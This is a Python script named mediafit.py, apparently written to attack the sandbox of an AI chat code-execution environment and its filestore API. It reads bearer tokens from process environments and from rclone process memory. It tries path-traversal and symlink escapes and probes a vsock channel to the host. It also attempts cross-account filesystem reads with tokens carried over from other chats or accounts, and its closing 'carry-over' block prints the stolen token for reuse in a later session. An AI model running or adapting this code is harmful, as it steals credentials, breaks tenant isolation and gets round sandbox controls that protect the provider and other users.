#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mediafit.py v2.15.0
Filestore boundary hunt. Fixes v2.14 crash, adds: schema oracle, UUID/tagged-id
fsid resolver battery, roots=None token probe, FUSE round-trip, vsock probe,
multipart createFile, strings-based RPC enumeration, artifact path tracing.
"""
import os, sys, json, re, time, ssl, base64, hashlib, hmac, socket, struct
import subprocess, traceback, uuid as _uuid
import urllib.request, urllib.error

VER    = "2.15.0"
BASE   = "https://api.anthropic.com/v1/filestore/fs/"
CONF   = "/dev/shm/rclone-boot/config.json"
OUTDIR = "/mnt/user-data/outputs"
ROOTS  = {"/outputs": OUTDIR, "/uploads": "/mnt/user-data/uploads",
          "/tool_results": "/mnt/user-data/tool_results", "/transcripts": "/mnt/transcripts"}

# ============ CARRY-OVER SLOT (paste from a previous chat / other account) ============
PREV_FSID           = ""
PREV_TOKEN          = ""
OTHER_ACCOUNT_TOKEN = ""
OTHER_ACCOUNT_FSID  = ""
# =====================================================================================

OUT, G = [], {}
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n" + "=" * 70 + "\n### " + t + "\n" + "=" * 70)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        " + str(ev)[:1400])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a, t=30):
    try:
        p = subprocess.run(a, capture_output=True, timeout=t)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x):
    if isinstance(x, (dict, list)): x = json.dumps(x, separators=(",", ":"))
    x = x if isinstance(x, bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n, f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s" % (n, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:220])
def bstr(d):  # printable strings out of a decoded protobuf blob
    return " | ".join(re.findall(rb"[\x20-\x7e]{4,}", d))[:900]

_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
def http(url, method="POST", token=None, body=None, t=12, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if body is not None and not isinstance(body, bytes): body = json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"):
        h["Content-Type"] = "application/json"
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=body)
    try:
        r = urllib.request.urlopen(req, timeout=t, context=_CTX); return r.status, r.read(300000)
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e: return None, ("ERR:%s" % e).encode()
def api(m, payload, token=None, t=12):
    return http(BASE + m, "POST", token, payload, t, {"Connect-Protocol-Version": "1"})

# --------------------------------------------------------------- 1
def s_env():
    head("1. ENVIRONMENT DEEP PROBE")
    for c in [["uname","-a"], ["cat","/proc/version"], ["cat","/proc/1/cmdline"],
              ["readlink","-f","/proc/1/exe"], ["sh","-c","ls -la /dev | head -60"],
              ["sh","-c","ls -la /opt /opt/rclone 2>&1 | head -40"],
              ["sh","-c","cat /proc/net/dev 2>/dev/null"],
              ["sh","-c","dmesg 2>/dev/null | head -15"]]:
        rc, o, e = sh(c)
        w("    $ %s\n        %s" % (" ".join(c), (o or e).strip()[:700].replace("\x00"," ")))
    try: G["devs"] = sorted(os.listdir("/dev"))
    except Exception: G["devs"] = []
    rec("I", "vsock device present: %s" % ("/dev/vsock" in G["devs"]))
    rec("I", "fuse present: %s" % ("/dev/fuse" in G["devs"]))

def s_vsock():
    head("9. VSOCK PROBE (host<->guest channel)")
    AF = getattr(socket, "AF_VSOCK", 40)
    if not hasattr(socket, "AF_VSOCK"):
        rec("U", "python lacks AF_VSOCK; trying raw"); return
    for port in [1024, 2024, 5000, 5001, 5002, 80, 443, 8080]:
        try:
            s = socket.socket(AF, socket.SOCK_STREAM); s.settimeout(3)
            s.connect((2, port))
            banner = b""
            try:
                s.sendall(b"GET / HTTP/1.0\r\nHost: host\r\n\r\n")
                time.sleep(0.4); banner = s.recv(600)
            except Exception: pass
            w("    vsock CID=2 port=%-5d CONNECTED  banner=%r" % (port, banner[:220]))
            rec("P", "vsock host port %d reachable" % port)
            s.close()
        except Exception as e:
            w("    vsock CID=2 port=%-5d %s" % (port, str(e)[:90]))
    # also try local TCP to process_api
    for u in ["http://127.0.0.1:2024/", "http://127.0.0.1:5001/", "http://127.0.0.1:5002/"]:
        st, b = http(u, "GET", None, None, 4)
        w("    TCP %-30s -> %s %r" % (u, st, b[:200]))

# --------------------------------------------------------------- 2
def s_artifacts():
    head("2. ARTIFACT HUNT (where do foreign fsids/tokens live?)")
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    PAT = re.compile(rb"claude_chat_[A-Za-z0-9]{18,30}")
    WSP = re.compile(rb"(?:wrkspc|claude_workspace|claude_user|claude_org)_[A-Za-z0-9]{10,40}")
    hits = {"fsid": {}, "jwt": {}, "wsp": {}}
    roots = ["/dev/shm","/tmp","/var/log","/root","/home","/opt","/etc","/mnt/skills",
             "/mnt/transcripts","/mnt/user-data/uploads","/mnt/user-data/tool_results",
             "/mnt/user-data/outputs"]
    for root in roots:
        for dp, dn, fn in os.walk(root):
            if dp.count("/") > 8: dn[:] = []
            for f in fn[:90]:
                fp = os.path.join(dp, f)
                try:
                    if os.path.getsize(fp) > 5_000_000: continue
                    d = open(fp, "rb").read()
                except Exception: continue
                for m in set(PAT.findall(d)): hits["fsid"].setdefault(m.decode(), set()).add(fp)
                for m in set(JWT.findall(d)): hits["jwt"].setdefault(m.decode(), set()).add(fp)
                for m in set(WSP.findall(d)): hits["wsp"].setdefault(m.decode(), set()).add(fp)
    for k in hits:
        for v, ps in hits[k].items():
            w("    %-4s %-46s <- %s" % (k, v[:46], sorted(ps)[:3]))
    G["FSIDS"] = sorted(hits["fsid"].keys())
    for x in (PREV_FSID, OTHER_ACCOUNT_FSID):
        if x and x not in G["FSIDS"]: G["FSIDS"].append(x)
    G["WSP"] = sorted(hits["wsp"].keys())
    rec("P" if len(G["FSIDS"]) > 1 else "U", "fsid pool=%s" % G["FSIDS"])
    rec("I", "workspace-ish ids=%s" % G["WSP"][:6])
    # binaries / keys / cli
    rc, o, _ = sh(["sh","-c","find / -xdev -name '*filestore*' -o -xdev -name '*.pem' "
                           "-o -xdev -name '*filestore*cli*' 2>/dev/null | head -40"])
    w("    find filestore/pem: %s" % o.strip()[:500])
    rc, o, _ = sh(["sh","-c","ls -la /opt/rclone/ 2>/dev/null | head -30; "
                           "readlink -f /proc/1/exe"])
    w("    rclone dir + pid1 exe: %s" % o.strip()[:600])
    rc, o, _ = sh(["sh","-c","strings -n 30 /opt/rclone/rclone-filestore 2>/dev/null "
                           "| grep -m6 -E 'BEGIN (PUBLIC|EC|PRIVATE)' "])
    if o.strip(): w("    PEM in binary: %s" % o.strip()[:300])

# --------------------------------------------------------------- 3
def s_tokens():
    head("3. TOKEN FORENSICS (all claims + roots=None probe)")
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def add(t):
        t = t.decode() if isinstance(t, bytes) else t
        t = t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    try: G["fsid"] = [m["filesystem_id"] for m in json.loads(open(CONF).read())["mounts"]
                      if m.get("filesystem_id")][0]
    except Exception as e: rec("U", "config: %s" % e)
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): add(m)
            except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline" % p, "rb").read(): continue
            maps = open("/proc/%s/maps" % p).read().splitlines(); mem = open("/proc/%s/mem" % p, "rb", 0)
        except Exception: continue
        for line in maps:
            try: a, b2, perms = line.split()[0], line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0, e0 = [int(x, 16) for x in a.split("-")]
            except Exception: continue
            if not (0 < e0 - s0 <= 256*1024*1024): continue
            try: mem.seek(s0); d = mem.read(e0 - s0)
            except Exception: continue
            for m in JWT.findall(d): add(m)
    for root in ["/dev/shm","/tmp","/root","/etc","/var/log"]:
        for dp, dn, fn in os.walk(root):
            for f in fn[:50]:
                try: d = open(os.path.join(dp, f), "rb").read()
                except Exception: continue
                for m in JWT.findall(d): add(m)
    TD = []
    for t in TK:
        try:
            h, p, s = t.split("."); TD.append({"tok": t, "hdr": json.loads(b64d(h)),
                                               "pl": json.loads(b64d(p)), "sig": s})
        except Exception: pass
    G["TD"] = TD
    w("    tokens=%d" % len(TD))
    for i, r in enumerate(TD):
        pl = r["pl"]
        w("    [%d] roots=%-18s ro=%-5s pres=%-5s iss=%-14s sub=%s" %
          (i, pl.get("allowed_roots"), pl.get("readonly"), pl.get("claude_presented"),
           pl.get("iss"), str(pl.get("sub"))[:12]))
        for k in ("account_uuid","workspace_uuid","org_uuid","workspace_tagged_id",
                  "resolved_workspace_tagged_id","organization_uuid","aud","filesystem_id"):
            if k in pl: w("          %s = %s" % (k, pl[k]))
    for r in TD:
        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"] = r["tok"]; break
    G["TOKEN"] = G.get("TOKEN") or (TD[0]["tok"] if TD else None)
    G["NOTOKEN"] = [r["tok"] for r in TD if not r["pl"].get("allowed_roots")]
    G["CLAIMS"] = TD[0]["pl"] if TD else {}
    rec("P" if G.get("TOKEN") else "F", "tokens=%d rootsNone=%d" % (len(TD), len(G["NOTOKEN"])))
    # probe the roots=None token on every root
    for i, tk in enumerate(G["NOTOKEN"]):
        for rp in ["/outputs", "/transcripts", "/uploads", "/tool_results", "/"]:
            st, b = api("listDirectory", {"filesystem_id": G.get("fsid"), "path": rp}, tk)
            w("    rootsNone token[%d] path=%-14s -> %s %s" % (i, rp, st, b[:110].decode("utf-8","replace")))
            if st == 200 and rp != "/outputs":
                rec("P", "roots=None token grants %s (ACL gap?)" % rp)

# --------------------------------------------------------------- 4
def s_schema():
    head("4. SCHEMA ORACLE (buf.validate leak)")
    def explain(body):
        try: j = json.loads(body)
        except Exception: return ""
        out = []
        for v in (j.get("debug", {}) or {}).get("violations", []) or []:
            fn = "".join(e.get("fieldName", "?") for e in v.get("field", {}).get("elements", []))
            out.append("%s :: %s" % (fn or "?", v.get("message", "")))
        for d in j.get("details", []) or []:
            try: out.append("raw: " + bstr(b64d(d.get("value", ""))))
            except Exception: pass
        return " ;; ".join(out)[:900]
    for m, payload in [("listDirectory", {}), ("readFile", {}), ("createFile", {}),
                       ("moveFile", {}), ("copyFile", {}), ("removeFile", {})]:
        st, b = api(m, payload, G.get("TOKEN"))
        w("    %-14s {} -> %s\n        %s" % (m, st, explain(b) or b[:300].decode("utf-8","replace")))
    # decode the fsid regex rule fully
    st, b = api("listDirectory", {"filesystem_id": "!", "path": "/outputs"}, G.get("TOKEN"))
    try:
        j = json.loads(b)
        for d in j.get("details", []):
            dec = b64d(d.get("value", ""))
            w("    FSID RULE DECODED: %s" % bstr(dec))
            w("    FSID RULE HEX: %s" % dec.hex()[:400])
    except Exception: pass

# --------------------------------------------------------------- 5
def s_fsid_battery():
    head("5. FSID RESOLVER BATTERY  <-- highest-value test")
    T = G.get("TOKEN"); c = G.get("CLAIMS")
    own = G.get("fsid")
    cand = [("own fsid (control)", own), ("random uuid", str(_uuid.uuid4())),
            ("random tagged", "claude_chat_" + b64e(os.urandom(18))[:24])]
    for k in ("account_uuid", "workspace_uuid", "org_uuid", "organization_uuid"):
        if c.get(k): cand.append((k, c[k]))
    for k in ("workspace_tagged_id", "resolved_workspace_tagged_id"):
        if c.get(k): cand.append((k, c[k]))
    for lit in ["user", "account", "workspace", "default", "root", "home"]:
        cand.append(("literal:" + lit, lit))
    for pre in ["wrkspc_", "claude_workspace_", "claude_user_", "claude_org_", "user_", "acct_"]:
        cand.append((pre + "rnd", pre + b64e(os.urandom(12))[:20]))
    for f in [x for x in G.get("FSIDS", []) if x != own]: cand.append(("discovered fsid", f))
    if PREV_FSID: cand.append(("PREV_FSID", PREV_FSID))
    for label, val in cand:
        st, b = api("listDirectory", {"filesystem_id": val, "path": "/outputs"}, T)
        msg = b[:150].decode("utf-8","replace")
        good = st == 200
        w("    %-26s -> %s %s%s" % (label, st, msg, "   <== ACCEPTED" if good else ""))
        if good and label != "own fsid (control)":
            rec("P", "FSID ACCEPTED: %s = %s" % (label, val))
    rec("I", "compare message text: 'invalid filesystem id' = rejected; "
             "'not permitted' = accepted fsid, path denied")

# --------------------------------------------------------------- 6
def s_roundtrip():
    head("6. LOCAL WRITE -> SERVER VISIBILITY ROUND-TRIP")
    T = G.get("TOKEN"); own = G.get("fsid")
    tok = "mediafit-" + b64e(os.urandom(8))
    fp = OUTDIR + "/__mf_probe.txt"
    try:
        open(fp, "w").write(tok); w("    wrote local %s" % fp)
    except Exception as e: rec("F", "local write failed: %s" % e); return
    try: os.makedirs(OUTDIR + "/__mf_dir", exist_ok=True)
    except Exception: pass
    time.sleep(2)
    st, b = api("listDirectory", {"filesystem_id": own, "path": "/outputs"}, T)
    w("    listDirectory -> %s\n        %s" % (st, b[:1200].decode("utf-8","replace")))
    rec("P" if b"__mf_probe" in b else "U", "file visible server-side: %s" % (b"__mf_probe" in b))
    st, b = api("readFile", {"filesystem_id": own, "path": "/outputs/__mf_probe.txt"}, T)
    w("    readFile -> %s body=%r" % (st, b[:200]))
    rec("P" if (st == 200 and tok.encode() in b) else "U", "round-trip content match")
    try: G["OUTF"] = "__mf_probe.txt"
    except Exception: pass
    for rp, lp in ROOTS.items():
        try:
            fl = sorted(x for x in os.listdir(lp) if not x.startswith("."))
            w("    local %-16s -> %s" % (rp, fl[:6]))
            if fl: G["SAMPLE_" + rp] = fl[0]
        except Exception as e: w("    local %-16s -> ERR %s" % (rp, e))

# --------------------------------------------------------------- 7
def s_escape():
    head("7. PATH + SYMLINK ESCAPE")
    T = G.get("TOKEN"); own = G.get("fsid")
    trf = G.get("SAMPLE_/transcripts")
    tests = []
    if trf:
        tests = ["/transcripts/" + trf, "//transcripts/" + trf, "/./transcripts/" + trf,
                 "/outputs/../transcripts/" + trf, "/outputs/./../transcripts/" + trf,
                 "/outputs/../../transcripts/" + trf, "/outputs//" + trf]
    tests += ["/outputs/../outputs/__mf_probe.txt", "/outputs/..", "/", "/outputs/./"]
    for pth in tests:
        st, b = api("readFile", {"filesystem_id": own, "path": pth}, T)
        w("    %-46s -> %s %s" % (pth, st, b[:90].decode("utf-8","replace")))
    for tgt, name in [("/transcripts", "__mf_tr"), ("/", "__mf_root"),
                      ("/uploads", "__mf_up"), ("/tool_results", "__mf_tool")]:
        lp = OUTDIR + "/" + name
        try:
            if os.path.islink(lp) or os.path.exists(lp): os.remove(lp)
        except Exception: pass
        try: os.symlink(tgt, lp); w("    symlink %s -> %s" % (name, tgt))
        except Exception as e: w("    symlink %s failed: %s" % (name, e))
    time.sleep(2)
    st, b = api("listDirectory", {"filesystem_id": own, "path": "/outputs"}, T)
    w("    listDirectory after symlinks -> %s\n        %s" % (st, b[:900].decode("utf-8","replace")))
    probes = []
    if trf: probes += [("/outputs/__mf_tr/" + trf, "symlink->/transcripts"),
                       ("/outputs/__mf_root/transcripts/" + trf, "symlink->/")]
    probes += [("/outputs/__mf_root/outputs/__mf_probe.txt", "symlink->/ (self)")]
    for pth, lbl in probes:
        st, b = api("readFile", {"filesystem_id": own, "path": pth}, T)
        w("    %-46s -> %s  [%s]" % (pth, st, lbl))
        if st == 200: rec("P", "SYMLINK ESCAPE via %s (%s)" % (lbl, pth))
        elif st == 403: rec("I", "symlink not followed for %s" % lbl)

# --------------------------------------------------------------- 8
def s_multipart():
    head("8. MULTIPART createFile / MOVE / COPY / REMOVE")
    T = G.get("TOKEN"); own = G.get("fsid")
    B = "----mediafit" + b64e(os.urandom(6))
    def mp(fields, fname=None, fdata=None):
        out = b""
        for k, v in fields.items():
            out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (B, k, v)).encode()
        if fname is not None:
            out += ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
                    "Content-Type: application/octet-stream\r\n\r\n" % (B, fname)).encode()
            out += fdata + b"\r\n"
        return out + ("--%s--\r\n" % B).encode()
    H = {"Content-Type": "multipart/form-data; boundary=" + B, "Connect-Protocol-Version": "1"}
    for label, fields, fn, fd in [
        ("minimal", {"filesystem_id": own, "path": "/outputs/__mf_cf.txt"}, "f.txt", b"hello"),
        ("with-dir-field", {"filesystem_id": own, "path": "/outputs", "name": "__mf_cf2.txt"}, "f.txt", b"hi2"),
        ("dirfield-only", {"filesystem_id": own, "directory": "/outputs", "name": "__mf_cf3.txt"}, "f.txt", b"hi3")]:
        st, b = http(BASE + "createFile", "POST", T, mp(fields, fn, fd), 15, H)
        w("    createFile[%s] -> %s %s" % (label, st, b[:260].decode("utf-8","replace")))
        if st == 200: rec("P", "createFile works (%s)" % label)
    st, b = http(BASE + "createFile", "POST", T, mp({}, "f.txt", b"x"), 12, H)
    w("    createFile[empty fields] -> %s %s" % (st, b[:400].decode("utf-8","replace")))
    for m in ["moveFile", "copyFile"]:
        for body in [{"filesystem_id": own, "source": "/outputs/__mf_probe.txt",
                      "destination": "/outputs/__mf_moved.txt"},
                     {"filesystem_id": own, "path": "/outputs/__mf_probe.txt",
                      "source": "/outputs/__mf_probe.txt", "destination": "/outputs/__mf_moved.txt"}]:
            st, b = api(m, body, T)
            w("    %s %s -> %s %s" % (m, list(body.keys())[-2:], st, b[:180].decode("utf-8","replace")))
    for body in [{"filesystem_id": own, "path": "/outputs/__mf_nope.txt"},
                 {"filesystem_id": own, "source": "/outputs/__mf_nope.txt"},
                 {"filesystem_id": own, "path": "/outputs/__mf_nope.txt", "force": True}]:
        st, b = api("removeFile", body, T)
        w("    removeFile %s -> %s %s" % (list(body.keys()), st, b[:180].decode("utf-8","replace")))
        if st == 500: rec("I", "removeFile 500 (unhandled) with %s" % list(body.keys()))

# --------------------------------------------------------------- 10
def s_methods():
    head("10. RPC SURFACE (strings + oracle)")
    cand = set()
    for b in ["/opt/rclone/rclone-filestore"]:
        rc, o, _ = sh(["sh","-c","strings -n 5 %s 2>/dev/null | grep -oE "
                               "'[a-z0-9_]+\\.[a-z0-9_]+\\.[a-z0-9_]+\\.[A-Za-z]+' | sort -u | head -60" % b])
        for m in re.findall(r"anthropic\.[a-z0-9_.]+", o): cand.add(m)
        w("    service strings: %s" % sorted(cand)[:8])
        rc, o, _ = sh(["sh","-c","strings -n 4 %s 2>/dev/null | grep -oE '\"(fs|files|filestore|admin)/[A-Za-z]+' | sort -u | head -60" % b])
        w("    route strings: %s" % o.strip()[:600])
    words = ["listDirectory","readFile","createFile","moveFile","copyFile","removeFile",
             "listFiles","listFilesystems","getFilesystem","getFilesystemUsage","statFile",
             "stat","signC2PA","writeFile","importFiles","importZip","reassignFilesystem",
             "listRoots","getFileMetadata","makeDirectory","createDirectory","deleteFile",
             "listSessions","getSession","exportZip","downloadZip","renameFile"]
    live = []
    for m in words:
        st, b = api(m, {"filesystem_id": G.get("fsid"), "path": "/outputs"}, G.get("TOKEN"), 8)
        if st not in (404, None):
            live.append((m, st)); w("    %-22s -> %s %s" % (m, st, b[:150].decode("utf-8","replace")))
    G["LIVE"] = [m for m, _ in live]
    rec("P" if live else "F", "live=%s" % G["LIVE"])

# --------------------------------------------------------------- 11
def s_matrix():
    head("11. CROSS-FS MATRIX")
    own = G.get("fsid")
    toks = {"own": G.get("TOKEN")}
    if PREV_TOKEN: toks["prev-chat"] = PREV_TOKEN
    if OTHER_ACCOUNT_TOKEN: toks["other-acct"] = OTHER_ACCOUNT_TOKEN
    fsids = {"own": own}
    if PREV_FSID: fsids["prev"] = PREV_FSID
    if OTHER_ACCOUNT_FSID: fsids["other-acct"] = OTHER_ACCOUNT_FSID
    for f in G.get("FSIDS", []):
        if f != own: fsids["disc:" + f[-8:]] = f
    for tn, tk in toks.items():
        if not tk: continue
        for fn, fv in fsids.items():
            st, b = api("listDirectory", {"filesystem_id": fv, "path": "/outputs"}, tk)
            mark = "   <== CROSS-FS READ" if (st == 200 and not (tn == "own" and fn == "own")) else ""
            w("    token=%-11s fsid=%-16s -> %s%s" % (tn, fn, st, mark))
            if mark:
                rec("P", "CROSS-FS READ token=%s fsid=%s" % (tn, fn))
                st2, b2 = api("readFile", {"filesystem_id": fv, "path": "/outputs/__mf_probe.txt"}, tk)
                w("        readFile -> %s %s" % (st2, b2[:120]))

# --------------------------------------------------------------- 12
def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P))
    w("  FAIL %d: %s" % (len(F), F))
    w("  UNK  %d: %s" % (len(U), U))
    w("  live methods: %s" % G.get("LIVE"))
    w("  fsid pool: %s" % G.get("FSIDS"))
    w("\n  -------- CARRY-OVER (paste into the NEXT chat) --------")
    w("PREV_FSID  = %r" % (G.get("fsid") or ""))
    w("PREV_TOKEN = %r" % (G.get("TOKEN") or ""))
    w("ACCOUNT_UUID = %r" % (G.get("CLAIMS", {}).get("account_uuid") or ""))
    w("  -------------------------------------------------------")

def main():
    for n, f in [("env", s_env), ("vsock", s_vsock), ("artifacts", s_artifacts),
                 ("tokens", s_tokens), ("schema", s_schema), ("fsid", s_fsid_battery),
                 ("roundtrip", s_roundtrip), ("escape", s_escape), ("multipart", s_multipart),
                 ("methods", s_methods), ("matrix", s_matrix), ("verdict", s_verdict)]:
        step(n, f)
try: main()
except Exception as e:
    w("!! main %s" % e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in ["/mnt/user-data/outputs", "/tmp", "/root"]:
        try:
            os.makedirs(d, exist_ok=True); open(d + "/mediafit-report.txt", "w").write(txt)
        except Exception: pass
    print("\nwritten to /mnt/user-data/outputs/mediafit-report.txt")